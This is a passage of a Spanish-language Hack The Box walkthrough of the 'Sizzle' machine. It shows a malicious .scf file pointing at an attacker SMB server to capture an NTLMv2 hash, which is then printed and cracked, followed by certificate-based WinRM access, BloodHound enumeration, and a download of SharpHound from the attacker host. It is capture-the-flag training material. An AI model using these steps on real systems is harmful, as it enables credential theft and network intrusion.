drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 Users
drw-rw-rw-          0  Mon Jul  2 14:32:58 2018 ZZ_ARCHIVE
<span class="c"># cd Users</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 <span class="nb">.</span>
drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 ..
drw-rw-rw-          0  Mon Jul  2 14:18:43 2018 amanda
drw-rw-rw-          0  Mon Jul  2 14:19:06 2018 amanda_adm
drw-rw-rw-          0  Mon Jul  2 14:18:28 2018 bill
drw-rw-rw-          0  Mon Jul  2 14:18:31 2018 bob
drw-rw-rw-          0  Mon Jul  2 14:19:14 2018 chris
drw-rw-rw-          0  Mon Jul  2 14:18:39 2018 henry
drw-rw-rw-          0  Mon Jul  2 14:18:34 2018 joe
drw-rw-rw-          0  Mon Jul  2 14:18:53 2018 jose
drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 lkys37en
drw-rw-rw-          0  Mon Jul  2 14:18:48 2018 morgan
drw-rw-rw-          0  Mon Jul  2 14:19:20 2018 mrb3n
drw-rw-rw-          0  Wed Sep 26 00:45:32 2018 Public
<span class="c">#</span>
</code></pre></div></div>

<ul>
  <li>Si ingresamos al directorio <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> encontramos archivos con diferentes extensiones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cd ZZ_ARCHIVE</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Mon Jul  2 14:32:58 2018 <span class="nb">.</span>
drw-rw-rw-          0  Mon Jul  2 14:32:58 2018 ..
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 AddComplete.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 AddMerge.ram
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 ConfirmUnprotect.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 ConvertFromInvoke.mov
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 ConvertJoin.docx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 CopyPublish.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:56 2018 DebugMove.mpg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 DebugSelect.mpg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 DebugUse.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 DisconnectApprove.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 DisconnectDebug.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 EditCompress.xls
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 EditMount.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 EditSuspend.mp3
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 EnableAdd.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 EnablePing.mov
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 EnableSend.ppt
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 EnterMerge.mpeg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 ExitEnter.mpg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 ExportEdit.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 GetOptimize.pdf
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 GroupSend.rm
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 HideExpand.rm
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 InstallWait.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 JoinEnable.ram
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 LimitInstall.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 LimitStep.ppt
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 MergeBlock.mp3
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 MountClear.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 MoveUninstall.docx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 NewInitialize.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 OutConnect.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 PingGet.dot
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:56 2018 ReceiveInvoke.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 RemoveEnter.mpeg3
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 RemoveRestart.mpeg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 RequestJoin.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 RequestOpen.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 ResetCompare.avi
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 ResetUninstall.mpeg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 ResumeCompare.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 SelectPop.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 SuspendWatch.mp4
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 SwitchConvertFrom.mpg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 UndoPing.rm
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 UninstallExpand.mp3
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 UnpublishSplit.ppt
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 UnregisterPing.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 UpdateRead.mpeg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 WaitRevoke.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 WriteUninstall.mp3
</code></pre></div></div>

<ul>
  <li>
    <p>Una cosa que podemos hacer es tratar de robar el hash <code class="language-plaintext highlighter-rouge">ntlmv2</code> de un usuario como vimos cada usuario tiene su propia carpeta y si el usuario tiene interacción con el contenido dentro podemos robar el hash.</p>
  </li>
  <li>
    <p>Para esto podemos usar <code class="language-plaintext highlighter-rouge">smbcacls</code> para ver los privilegios de su carpeta.</p>
  </li>
  <li>
    <p>Como podemos ver en el campo <code class="language-plaintext highlighter-rouge">Everyone</code> solo tenemos privilegios de lectura.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbcacls <span class="s2">"//10.10.10.103/Department Shares"</span> Users/amanda <span class="nt">-N</span>
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN<span class="se">\A</span>dministrators
GROUP:HTB<span class="se">\D</span>omain Users
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN<span class="se">\A</span>dministrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY<span class="se">\S</span>YSTEM:ALLOWED/OI|CI|I/FULL
</code></pre></div></div>

<ul>
  <li>En la carpeta Public tenemos privilegios máximos ya que nos dice FULL.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbcacls <span class="s2">"//10.10.10.103/Department Shares"</span> Users/Public <span class="nt">-N</span>
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN<span class="se">\A</span>dministrators
GROUP:HTB<span class="se">\D</span>omain Users
ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN<span class="se">\A</span>dministrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY<span class="se">\S</span>YSTEM:ALLOWED/OI|CI|I/FULL
</code></pre></div></div>

<ul>
  <li>Como ya lo hemos hecho antes vamos a cargar un archivo que vamos a compartir con <code class="language-plaintext highlighter-rouge">smbserver</code> será un <code class="language-plaintext highlighter-rouge">.scf</code> será un icono lo que vera la victima y al darle <code class="language-plaintext highlighter-rouge">click</code> nos llegara el hash de la persona que lo intento cargar ya se emite un autenticación.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>hash.scf
<span class="o">[</span>Shell]
<span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>10.10.14.71<span class="se">\F</span>older<span class="se">\i</span>con.ico
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora subimos el archivo ala carpeta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient htb.local/null@sizzle.htb.local <span class="nt">-no-pass</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Department Shares</span>
<span class="c"># cd Users\Public</span>
<span class="c"># put hash.scf</span>
</code></pre></div></div>

<ul>
  <li>Después de unos segundos nos llega el hash que es de Amanda.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.103,52801<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>HTB<span class="se">\a</span>manda,SIZZLE<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User SIZZLE<span class="se">\a</span>manda authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> amanda::HTB:aaaaaaaaaaaaaaaa:b6b9e7420adb21b554ce2502a3af7583:0101000000000000000ddd4c1aa0da01e345ec5d81d362cb00000000010010006d0072005200550074006a0071005300030010006d0072005200550074006a00710053000200100067004c006f005900630069005a0045000400100067004c006f005900630069005a00450007000800000ddd4c1aa0da01060004000200000008003000300000000000000001000000002000001cd9936ab3683d22314c590a82ef3b9b4bea0d6476fbbae07c04c9103b9c4b6d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0037003100000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span>-] SMB2_TREE_CONNECT not found Folder
<span class="o">[</span>-] SMB2_TREE_CONNECT not found Folder
</code></pre></div></div>

<ul>
  <li>Vamos a crackearlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Ashare1972       <span class="o">(</span>amanda<span class="o">)</span>
1g 0:00:03:00 DONE <span class="o">(</span>2024-05-06 19:07<span class="o">)</span> 0.005540g/s 63249p/s 63249c/s 63249C/s Ashiah08..Arsenic
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<h2 id="shell-as-amanda">Shell as amanda</h2>

<ul>
  <li>Ahora comprobamos que las credenciales sean correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.10.103 <span class="nt">-u</span> amanda <span class="nt">-p</span> Ashare1972
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] HTB.LOCAL<span class="se">\a</span>manda:Ashare1972
</code></pre></div></div>

<ul>
  <li>Si comprobamos con <code class="language-plaintext highlighter-rouge">winrm</code> vemos que nos da errores básicamente nos están expuestos estos servicios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.10.10.103 <span class="nt">-u</span> amanda <span class="nt">-p</span> Ashare1972
SMB         10.10.10.103    5986   SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span>
HTTP        10.10.10.103    5986   SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> https://10.10.10.103:5986/wsman
WINRM       10.10.10.103    5986   SIZZLE           <span class="o">[</span>-] HTB.LOCAL<span class="se">\a</span>manda:Ashare1972 <span class="s2">"The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''"</span>
</code></pre></div></div>

<ul>
  <li>Si recordamos en esta ruta nos piden credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/3.png" />
</p>

<ul>
  <li>Si probamos las credenciales que tenemos son correctas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/4.png" />
</p>

<ul>
  <li>Con <code class="language-plaintext highlighter-rouge">evil-winrm</code> podemos conectarnos empleando un certificado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-h</span>

Evil-WinRM shell v3.5

Usage: evil-winrm <span class="nt">-i</span> IP <span class="nt">-u</span> USER <span class="o">[</span><span class="nt">-s</span> SCRIPTS_PATH] <span class="o">[</span><span class="nt">-e</span> EXES_PATH] <span class="o">[</span><span class="nt">-P</span> PORT] <span class="o">[</span><span class="nt">-p</span> PASS] <span class="o">[</span><span class="nt">-H</span> HASH] <span class="o">[</span><span class="nt">-U</span> URL] <span class="o">[</span><span class="nt">-S</span><span class="o">]</span> <span class="o">[</span><span class="nt">-c</span> PUBLIC_KEY_PATH <span class="o">]</span> <span class="o">[</span><span class="nt">-k</span> PRIVATE_KEY_PATH <span class="o">]</span> <span class="o">[</span><span class="nt">-r</span> REALM] <span class="o">[</span><span class="nt">--spn</span> SPN_PREFIX] <span class="o">[</span><span class="nt">-l</span><span class="o">]</span>
    <span class="nt">-S</span>, <span class="nt">--ssl</span>                        Enable ssl
    <span class="nt">-c</span>, <span class="nt">--pub-key</span> PUBLIC_KEY_PATH    Local path to public key certificate
    <span class="nt">-k</span>, <span class="nt">--priv-key</span> PRIVATE_KEY_PATH  Local path to private key certificate
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/5.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/6.png" />
</p>

<ul>
  <li>Con <code class="language-plaintext highlighter-rouge">openssl</code> vamos a crear claves.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  amanda openssl req <span class="nt">-newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-keyout</span> amanda.key <span class="nt">-out</span> amanda.csr
.+......+......+.+..+............+.........+.+..............+.+.....+......+...+....+...+..+.......+........+.+..+++++++++++++++++++++++++++++++++++++++<span class="k">*</span>......+...+.....+....+.....+....+......+...+...+...+++++++++++++++++++++++++++++++++++++++<span class="k">*</span>......+...........+......+...+....+..+.+........+......+.+..+..........+..+.........+.+...........+..........+..................+..+....+........+...+...+.+...+..+.+.....+...................+...+..+..........+...+...+...+..+.......+..+...+......+.........+.+...........+.+.....+.....................................+..+......+...+....+...+..+...............+.............+..+...+...+.+...+...+.....+....+.....+.+...+..+.............+...............+.........+.....+......+.......+.........+.....+.+.....+.......+.....+...+.......+...+...+.....+....+............+........+.+..+.......+...........+......+.+...+......+........+...+............+......+......+.+..............+....+......+...+......+..+...+............+.......+...+..+.............+............+.....+......+.+...+..+.+............+......+.................+............+......+.+........+.+...........++++++
.....+++++++++++++++++++++++++++++++++++++++<span class="k">*</span>......+.+..+.......+.....+...+.......+......+.....+...+......+...+......+.......+..+...+...+.+.....+.+.........+++++++++++++++++++++++++++++++++++++++<span class="k">*</span>.....+.....+.+.....+...+.......+.....+...+..........+.....................+..+...+......+.+..+.+.........+.....+...+....+..................+............+..................+..+.+.....+.......+...+...+............+.....+.............+......+...........+...+.+.....+.........+.+...............+.....+.+..+......+.+...+......+.........+..+.+..+...+...............+...+.+...........+..................+.+.........+..+.........+................+............+...............+.....+...+....+...+........++++++
<span class="nt">-----</span>
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span class="s1">'.'</span>, the field will be left blank.
<span class="nt">-----</span>
Country Name <span class="o">(</span>2 letter code<span class="o">)</span> <span class="o">[</span>AU]:
State or Province Name <span class="o">(</span>full name<span class="o">)</span> <span class="o">[</span>Some-State]:
Locality Name <span class="o">(</span>eg, city<span class="o">)</span> <span class="o">[]</span>:
Organization Name <span class="o">(</span>eg, company<span class="o">)</span> <span class="o">[</span>Internet Widgits Pty Ltd]:
Organizational Unit Name <span class="o">(</span>eg, section<span class="o">)</span> <span class="o">[]</span>:
Common Name <span class="o">(</span>e.g. server FQDN or YOUR name<span class="o">)</span> <span class="o">[]</span>:
Email Address <span class="o">[]</span>:

Please enter the following <span class="s1">'extra'</span> attributes
to be sent with your certificate request
A challenge password <span class="o">[]</span>:
An optional company name <span class="o">[]</span>:
</code></pre></div></div>

<ul>
  <li>En al web vamos a proporcionar el <code class="language-plaintext highlighter-rouge">.csr</code> .</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  amanda <span class="nb">ls
</span>amanda.csr  amanda.key
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/7.png" />
</p>

<ul>
  <li>Y ahora solo le damos en <code class="language-plaintext highlighter-rouge">submit</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/8.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/9.png" />
</p>

<ul>
  <li>Ahora teniendo todo ya nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  amanda evil-winrm <span class="nt">-S</span> <span class="nt">-c</span> certnew.cer <span class="nt">-k</span> amanda.key <span class="nt">-i</span> 10.10.10.103 <span class="nt">-u</span> <span class="s1">'amanda'</span> <span class="nt">-p</span> <span class="s1">'Ashare1972'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>manda
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="shell-as-mrlky">Shell as mrlky</h2>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code> para enumerar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ bloodhound-python <span class="nt">-c</span> All <span class="nt">-d</span> htb.local <span class="nt">-u</span> <span class="s1">'amanda'</span> <span class="nt">-p</span> <span class="s1">'Ashare1972'</span> <span class="nt">-ns</span> 10.10.10.103
INFO: Found AD domain: htb.local
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>sizzle.HTB.LOCAL:88<span class="o">)]</span> <span class="o">[</span>Errno 110] Connection timed out
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 8 <span class="nb">users
</span>INFO: Found 53 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: sizzle.HTB.LOCAL
INFO: Done <span class="k">in </span>00M 21S
</code></pre></div></div>

<ul>
  <li>El usuario MRLKY es <code class="language-plaintext highlighter-rouge">kerberoastable</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/10.png" />
</p>

<ul>
  <li>El usuario MRLKY tiene privilegios <code class="language-plaintext highlighter-rouge">DCSYnc</code> pero primero necesitamos ser ese usuario.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/11.png" />
</p>

<ul>
  <li>El puerto 88 esta abierto lo necesitamos por que es el de <code class="language-plaintext highlighter-rouge">kerberos</code> pero solo desde dentro no podemos verlo expuesto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; netstat <span class="nt">-oat</span>

Active Connections

  Proto  Local Address          Foreign Address        State           PID      Offload State

  TCP    0.0.0.0:21             sizzle:0               LISTENING       2148	InHost
  TCP    0.0.0.0:80             sizzle:0               LISTENING       4	InHost
  TCP    0.0.0.0:88             sizzle:0               LISTENING       592	InHost
</code></pre></div></div>

<ul>
  <li>En caso de querer recolectar información del dominio desde dentro de la maquina existen limitaciones <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; curl <span class="nt">-o</span> SharpHound.ps1 http://10.10.14.71:8080/SharpHound.ps1
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         5/7/2024  10:04 AM        1680565 SharpHound.ps1


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\S</span>harpHound.ps1
Importing <span class="k">*</span>.ps1 files as modules is not allowed <span class="k">in </span>ConstrainedLanguage mode.
At line:1 char:1
+ Import-Module .<span class="se">\S</span>harpHound.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Module], InvalidOperationException
    + FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.ImportModuleCommand
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">ConstrainedLenguage</code> esto nos restringe para usar el SharpHound.ps1 <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/</a>.</p>
  </li>
  <li>
    <p>Para hacer un Bypass de eso vamos a usar lo siguiente <a href="https://github.com/padovah4ck/PSByPassCLM">https://github.com/padovah4ck/PSByPassCLM</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  content git clone https://github.com/padovah4ck/PSByPassCLM
Cloning into <span class="s1">'PSByPassCLM'</span>...
remote: Enumerating objects: 114, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 114 <span class="o">(</span>delta 0<span class="o">)</span>, reused 3 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 111
Receiving objects: 100% <span class="o">(</span>114/114<span class="o">)</span>, 2.15 MiB | 1.16 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>PSByPassCLM
➜  PSByPassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>PSBypassCLM  README.md  img
➜  PSByPassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>PSBypassCLM
➜  PSBypassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>PSBypassCLM  PsBypassCLM.sln
➜  PSBypassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>PSBypassCLM
➜  PSBypassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>AmsiBypass.cs  Program.cs  PsBypassCLM.csproj       bin
App.config     Properties  PsBypassCLM.csproj.user  obj
➜  PSBypassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>bin
➜  bin git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>Debug  x64  x86
➜  bin git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>x64
➜  x64 git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>Debug
➜  x64 git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>Debug
➜  Debug git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>PsBypassCLM.exe         PsBypassCLM.vshost.exe
PsBypassCLM.exe.config  PsBypassCLM.vshost.exe.config
PsBypassCLM.pdb         System.Management.Automation.dll
➜  Debug git:<span class="o">(</span>master<span class="o">)</span>
</code></pre></div></div>

